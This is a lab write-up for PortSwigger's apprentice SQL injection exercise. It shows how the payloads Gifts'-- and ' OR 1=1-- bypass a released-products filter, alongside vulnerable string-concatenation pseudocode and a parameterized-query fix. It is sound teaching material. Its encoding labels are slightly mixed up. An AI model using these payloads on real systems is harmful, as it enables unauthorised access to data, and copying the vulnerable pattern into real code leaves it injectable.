# SQL Injection — Retrieving Hidden Data via WHERE Clause

**Platform:** PortSwigger Web Academy  
**Category:** SQL Injection  
**Difficulty:** Apprentice  
**Lab URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data  

---

## Objective

Perform a SQL injection attack on the product category filter to make the application return all products, including unreleased ones.

---

## Background

When a web application uses user input directly inside a SQL query without sanitization, an attacker can inject their own SQL code to manipulate what the query does.

In this lab, the product category filter builds its query like this:

```sql
SELECT * FROM products WHERE category = '<user_input>' AND released = 1
```

The `released = 1` condition is what hides unreleased products. The goal is to break out of the string, comment out that condition, and return everything.

---

## Steps

### 1. Observe the normal request

Click any product category — for example **Gifts**. The URL becomes:

```
GET /filter?category=Gifts
```

The backend query being run:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Only released products in the Gifts category are returned.

---

### 2. Inject into the category parameter

Modify the URL to inject a SQL payload:

```
GET /filter?category=Gifts'--
```

What the backend query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The `--` is a SQL comment. Everything after it is ignored by the database engine. The `AND released = 1` condition is now commented out — but this only returns Gifts category items.

---

### 3. Return ALL products from ALL categories

Use `OR 1=1` to make the WHERE condition always true:

```
GET /filter?category='+OR+1=1--
```

URL-encoded version (what Burp sends):

```
GET /filter?category=' OR 1=1--
```

What the backend query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

Breaking this down:
- `category = ''` — empty string, matches nothing
- `OR 1=1` — always true, so every row passes the WHERE check
- `--` — comments out `AND released = 1`

The database returns **every product in every category**, including unreleased ones.

---

## Why This Works

The application concatenates user input directly into the SQL string with no escaping:

```python
# Vulnerable code (pseudocode)
query = "SELECT * FROM products WHERE category = '" + user_input + "' AND released = 1"
```

The single quote `'` in the payload closes the string the developer opened. Everything after it is interpreted as SQL syntax, not data. This is the fundamental mechanism behind all string-based SQL injection.

**Secure fix — parameterized query:**

```python
# Safe code
query = "SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (user_input,))
```

With parameterized queries, the input is always treated as data, never as SQL syntax. The `'` character in the input would be escaped automatically.

---

## Key Takeaway

> **Never concatenate user input into SQL queries.** The `OR 1=1--` payload is one of the most basic SQL injection tests. If it returns extra data, the endpoint is injectable. Always use parameterized queries or prepared statements.

---

## References

- [PortSwigger SQL injection — WHERE clause](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
